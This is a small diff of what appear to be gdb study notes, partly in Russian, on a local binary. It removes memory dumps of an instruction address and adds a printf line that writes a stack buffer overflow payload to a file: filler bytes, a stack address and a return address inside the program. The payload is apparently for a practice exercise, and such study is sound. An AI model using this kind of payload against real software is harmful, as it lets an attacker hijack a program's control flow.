@@ -1,8 +1,1 @@
-0x000000000040119e адрес
-
-x/5b 0x000000000040119e
-0x40119e <main+72>:	0xe8	0x8d	0xfe	0xff	0xff
-
-
-x/w 0x000000000040119e
-0x40119e <main+72>:	0xfffe8de8
+printf "AAAABBBBCCCC\xf0\xe2\xff\xff\xff\x7f\x00\x00\xa3\x11\x40\x00\x00\x00\x00\x00" > test - чтобы записать escape-последовательность в файл
